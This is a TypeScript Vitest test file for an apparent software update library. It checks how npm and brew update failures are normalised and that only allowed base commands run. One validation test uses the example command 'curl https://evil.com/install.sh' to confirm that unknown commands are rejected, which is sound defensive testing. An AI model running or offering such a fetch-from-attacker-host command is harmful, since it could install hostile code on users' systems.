import { describe, it, expect, vi, afterEach } from 'vitest';
import { EventEmitter } from 'node:events';
import type { ChildProcess } from 'node:child_process';
import type { UpdatePlan } from '../../types.js';
import {
  UpdateKitError,
  COMMAND_FAILED,
  PERMISSION_DENIED,
} from '../../errors.js';
import { applyDelegateUpdate } from '../delegate.js';

// Mock child_process.spawn
vi.mock('node:child_process', () => ({
  spawn: vi.fn(),
}));

import { spawn } from 'node:child_process';
const mockSpawn = vi.mocked(spawn);

afterEach(() => {
  vi.restoreAllMocks();
});

// ──────────────────────────────────────────────
// Helpers
// ──────────────────────────────────────────────

function delegatePlan(command: string[] = ['npm', 'install', '-g', 'my-app@2.0.0']): UpdatePlan {
  return {
    kind: {
      type: 'delegate-command',
      channel: 'npm-global',
      command,
      mode: 'execute',
    },
    fromVersion: '1.0.0',
    toVersion: '2.0.0',
    postAction: 'exit-after-apply',
  };
}

function createMockChildProcess(): ChildProcess & EventEmitter {
  const child = new EventEmitter() as ChildProcess & EventEmitter;
  child.stdout = new EventEmitter() as any;
  child.stderr = new EventEmitter() as any;
  child.kill = vi.fn().mockReturnValue(true);
  child.pid = 12345;
  return child;
}

function executeWithOutput(
  plan: UpdatePlan,
  exitCode: number,
  stdout: string,
  stderr: string,
): Promise<any> {
  const child = createMockChildProcess();
  mockSpawn.mockReturnValue(child);

  const promise = applyDelegateUpdate(plan, { mode: 'execute' });

  if (stdout) child.stdout!.emit('data', Buffer.from(stdout));
  if (stderr) child.stderr!.emit('data', Buffer.from(stderr));
  child.emit('close', exitCode);

  return promise;
}

// ──────────────────────────────────────────────
// npm permission errors → PERMISSION_DENIED
// ──────────────────────────────────────────────

describe('error normalization — npm permission errors', () => {
  it('maps EACCES to PERMISSION_DENIED', async () => {
    const plan = delegatePlan();
    await expect(
      executeWithOutput(plan, 1, '', 'npm ERR! code EACCES\nnpm ERR! path /usr/lib'),
    ).rejects.toThrow(expect.objectContaining({ code: PERMISSION_DENIED }));
  });

  it('maps "permission denied" to PERMISSION_DENIED', async () => {
    const plan = delegatePlan();
    await expect(
      executeWithOutput(plan, 1, '', 'Error: permission denied, mkdir /usr/local/lib'),
    ).rejects.toThrow(expect.objectContaining({ code: PERMISSION_DENIED }));
  });

  it('maps "Missing write access" to PERMISSION_DENIED', async () => {
    const plan = delegatePlan();
    await expect(
      executeWithOutput(plan, 1, '', 'npm ERR! Missing write access to /usr/local/lib'),
    ).rejects.toThrow(expect.objectContaining({ code: PERMISSION_DENIED }));
  });
});

// ──────────────────────────────────────────────
// brew "already installed" → success
// ──────────────────────────────────────────────

describe('error normalization — brew already installed', () => {
  it('treats "already installed" as success', async () => {
    const plan = delegatePlan(['brew', 'upgrade', '--cask', 'my-app']);
    const result = await executeWithOutput(
      plan,
      1,
      'Warning: my-app is already installed',
      '',
    );

    expect(result.kind).toBe('success');
  });

  it('treats "already up-to-date" as success', async () => {
    const plan = delegatePlan(['brew', 'upgrade', '--cask', 'my-app']);
    const result = await executeWithOutput(
      plan,
      1,
      '',
      'Warning: my-app already up-to-date',
    );

    expect(result.kind).toBe('success');
  });

  it('treats "is already the latest version" as success', async () => {
    const plan = delegatePlan(['brew', 'upgrade', '--cask', 'my-app']);
    const result = await executeWithOutput(
      plan,
      1,
      'my-app is already the latest version',
      '',
    );

    expect(result.kind).toBe('success');
  });
});

// ──────────────────────────────────────────────
// Generic failures → COMMAND_FAILED
// ──────────────────────────────────────────────

describe('error normalization — generic failures', () => {
  it('maps unknown non-zero exit code to COMMAND_FAILED', async () => {
    const plan = delegatePlan();
    await expect(
      executeWithOutput(plan, 1, '', 'Something went wrong'),
    ).rejects.toThrow(
      expect.objectContaining({ code: COMMAND_FAILED }),
    );
  });

  it('includes exit code and stderr in error message', async () => {
    const plan = delegatePlan();
    try {
      await executeWithOutput(plan, 127, '', 'command not found');
      expect.fail('should have thrown');
    } catch (error) {
      expect(error).toBeInstanceOf(UpdateKitError);
      expect((error as UpdateKitError).message).toContain('exit code 127');
      expect((error as UpdateKitError).message).toContain('command not found');
    }
  });
});

// ──────────────────────────────────────────────
// Exit code 0 → always success
// ──────────────────────────────────────────────

describe('error normalization — success', () => {
  it('returns success for exit code 0', async () => {
    const plan = delegatePlan();
    const result = await executeWithOutput(plan, 0, 'added 1 package', '');

    expect(result.kind).toBe('success');
    expect(result.stdout).toBe('added 1 package');
    expect(result.fromVersion).toBe('1.0.0');
    expect(result.toVersion).toBe('2.0.0');
  });
});

// ──────────────────────────────────────────────
// Command validation
// ──────────────────────────────────────────────

describe('command validation', () => {
  it('rejects empty command', async () => {
    const plan = delegatePlan([]);

    await expect(
      applyDelegateUpdate(plan, { mode: 'execute' }),
    ).rejects.toThrow(expect.objectContaining({ code: COMMAND_FAILED }));
  });

  it('rejects unknown base command', async () => {
    const plan = delegatePlan(['curl', 'https://evil.com/install.sh']);

    await expect(
      applyDelegateUpdate(plan, { mode: 'execute' }),
    ).rejects.toThrow(expect.objectContaining({ code: COMMAND_FAILED }));
  });

  it('allows npm command', async () => {
    const child = createMockChildProcess();
    mockSpawn.mockReturnValue(child);

    const plan = delegatePlan(['npm', '--version']);
    const promise = applyDelegateUpdate(plan, { mode: 'execute' });
    child.stdout!.emit('data', Buffer.from('10.0.0'));
    child.emit('close', 0);

    const result = await promise;
    expect(result.kind).toBe('success');
  });

  it('allows brew command', async () => {
    const child = createMockChildProcess();
    mockSpawn.mockReturnValue(child);

    const plan = delegatePlan(['brew', 'upgrade', '--cask', 'my-app']);
    const promise = applyDelegateUpdate(plan, { mode: 'execute' });
    child.emit('close', 0);

    const result = await promise;
    expect(result.kind).toBe('success');
  });
});
